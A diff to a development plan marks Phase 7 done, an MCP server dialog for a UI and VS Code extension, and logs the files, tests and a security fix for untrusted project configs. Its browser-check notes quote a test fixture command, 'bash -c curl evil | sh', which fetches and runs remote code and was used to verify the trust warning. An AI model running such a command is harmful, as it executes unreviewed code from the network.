@@ -541,22 +541,75 @@ Row menu: Edit, Enable/Disable, Reconnect, Tools (per-tool approval: ask / never
 
 ### Checklist
 
-- [ ] `features/mcp/`: `api/mcp.api.ts` (new endpoints), `domain/` (form ↔ config mapping, validation mirroring the server schema, token-looking value detection, status label; all with specs), `hooks/useMcpServers.ts` (list, mutations, 409 → refresh and show "changed elsewhere"), `components/McpDialog.tsx`, `McpServerRow.tsx`, `McpServerForm.tsx`, `McpToolList.tsx`.
-- [ ] `/mcp` in the slash commands opens it; the "⋯" menu gets "MCP servers".
-- [ ] VS Code: `doty.openMcp` command → host message `runCommand: openMcp` (follow the Phase 5 pattern in `host-messages.ts` on both sides, with specs).
-- [ ] The trust notice for an untrusted project file stays (now inside the dialog) and shows the file's server names and commands before the user trusts it.
-- [ ] Keyboard: full dialog keyboard flow; focus returns to the message box on close.
+- [x] `features/mcp/`: `api/mcp.api.ts` (new endpoints), `domain/` (form ↔ config mapping, validation mirroring the server schema, token-looking value detection, status label; all with specs), `hooks/useMcpServers.ts` (list, mutations, 409 → refresh and show "changed elsewhere"), `components/McpDialog.tsx`, `McpServerRow.tsx`, `McpServerForm.tsx`, `McpToolList.tsx`.
+- [x] `/mcp` in the slash commands opens it; the "⋯" menu gets "MCP servers".
+- [x] VS Code: `doty.openMcp` command → host message `runCommand: openMcp` (follow the Phase 5 pattern in `host-messages.ts` on both sides, with specs).
+- [x] The trust notice for an untrusted project file stays (now inside the dialog) and shows the file's server names and commands before the user trusts it.
+- [x] Keyboard: full dialog keyboard flow; focus returns to the message box on close.
 
 #### Progress
 
 ```
-Status: not started
-Last commit: —
-Done: —
+Status: done
+Last commit: see `git log` — "feat(ui,api,vscode): MCP dialog and /mcp (Phase 7)"
+Done:
+- ui/src/features/mcp:
+  - api/: save-mcp-server (PUT), patch-mcp-server (PATCH), delete-mcp-server
+    (DELETE); request-mcp throws McpConflictError (with the fresh list) on 409;
+    types updated (scope, disabled, toolNames, masked config, file hashes).
+  - domain/ (all with specs): mcp-server-form (form ↔ config; fields the form
+    doesn't edit are kept in `extra`), validate-mcp-server-form (mirrors the API
+    schema), looks-like-token, server-json ("Edit JSON"), tool-approval
+    (read / per-tool / collapse to ask|never), describe-server-summary
+    ("http · global · 12 tools", launch line for the trust notice),
+    can-edit-scope, server-actions (row menu per server).
+  - hooks/: useMcpServers (list + trust, reconnect, save, remove, enable/disable,
+    tool approval; 409 → fresh list + "changed elsewhere" message; baseHash per
+    scope), useMcpServerEditor (form / JSON mode, validation, save),
+    useMcpRowActions.
+  - components/: McpDialog, McpDialogActions, McpServerRow (status dot, summary,
+    menu hidden when empty), McpRowMenu (role=menu), McpServerForm, ArgsEditor,
+    KeyValueEditor (mask hint, token hint), McpToolList, McpTrustNotice (lists
+    each untrusted server and what it would run), McpConfigFiles (paths; opens
+    them in VS Code). McpServersSection removed.
+- Opening: `/mcp`, the "⋯" menu ("MCP servers"), the settings dialog (link
+  "Manage MCP servers…" replaces the old section), and the VS Code palette
+  command "Doty: MCP servers" (doty.openMcp → runCommand openMcp; HOST_COMMANDS
+  and parse specs on both sides). ChatBaseContext has isMcpDialogOpen.
+- Open file: new webview→host message `openMcpConfig { scope, root }`; the
+  extension resolves the path itself (vscode/src/domain/resolve-mcp-config-path,
+  + spec: data dir for global, `<root>/.doty/mcp.json` only for a root inside a
+  workspace folder) and says so when the file doesn't exist yet. HostBridge now
+  takes the data dir.
+- API: list views carry `toolNames` (pool snapshot) for per-tool approval.
+  Security fix: McpConfigEditsService refuses (403) to write an existing
+  project mcp.json that isn't trusted, because the write would re-trust servers
+  nobody reviewed (+ integration case). The UI disables project edits/adds
+  until the file is trusted (can-edit-scope).
+- Keyboard: Escape steps back (form/tools → list) then closes (document-level,
+  useEscapeKey); focus returns to the message box on close; row menus are
+  buttons with menu roles.
 Left: —
-Notes: —
+Notes:
+- Checks: ui lint, typecheck, test (57 files / 211 tests), build; api
+  lint:check, typecheck, test (100 suites / 518 tests), build; vscode typecheck,
+  test (24), build.
+- Browser check (Playwright, built API + vite on 5299, temp data dir, the
+  repo's fake stdio MCP fixture as a real server): /mcp opens the dialog;
+  validation; add stdio server with a literal token (token hint shown; file
+  stores it, mode 600); status connecting → "Connected · 2 tools"; Tools… sets
+  echo to "never" (file gets a per-tool map); Edit shows "••••" with the "stored
+  value kept" hint, name read-only; Edit JSON round-trip adds a field and keeps
+  the real token; disable/enable (key removed); outside edit → conflict message
+  and fresh list; untrusted project file → notice shows `shady bash -c curl evil
+  | sh`, no row actions in the browser, project add blocked; trust; remove
+  (confirm); Escape closes and focus returns to the message box; "⋯" menu has
+  "MCP servers"; 380px layout. No page errors.
+- Not checked here: the VS Code side (palette command, Open file). Phase 8's
+  end-to-end run in VS Code covers it.
+- Still open from Phase 3: a global server shadowed by a project server of the
+  same name isn't listed, so it can't be edited while shadowed.
 ```
-
 ---
 
 ## Phase 8 — Wrap-up (Session H)
